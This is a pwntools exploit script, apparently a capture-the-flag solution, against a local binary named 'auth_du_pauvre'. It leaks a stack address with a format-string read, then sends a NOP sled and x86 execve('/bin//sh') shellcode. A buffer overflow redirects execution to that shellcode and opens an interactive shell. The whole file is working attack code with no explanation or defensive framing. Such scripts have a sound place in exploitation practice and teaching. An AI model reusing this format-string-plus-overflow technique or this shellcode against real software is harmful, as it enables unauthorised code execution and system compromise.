#!/bin/python3
from pwn import *
from time import sleep

OFFSET = 0x0
DEBUG = False
if DEBUG:
    p = process("./auth_du_pauvre")
else:
    p = remote("127.0.0.1", 1234)
print(p.recv(4096).decode())
STAGE1 = b"%38$x "
STAGE1 += b"\x90"*0x8
#STAGE1 = b"A"*0x40 + b"\n"
STAGE1 += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+b"\n"
p.send(STAGE1)
sleep(0.5)
out = p.recv(4096)
print(out)
print("-----------------------")
out = out.decode(errors="ignore").split(" ")[2]
print(out)
shellcodeAddr = abs(int(out,16) -0x84)
print("Shellcode addr",hex(shellcodeAddr))
PAYLOAD = b"B"*(61-12)
PAYLOAD += p32(shellcodeAddr)

print(STAGE1 + PAYLOAD)
p.send(PAYLOAD)
p.interactive()

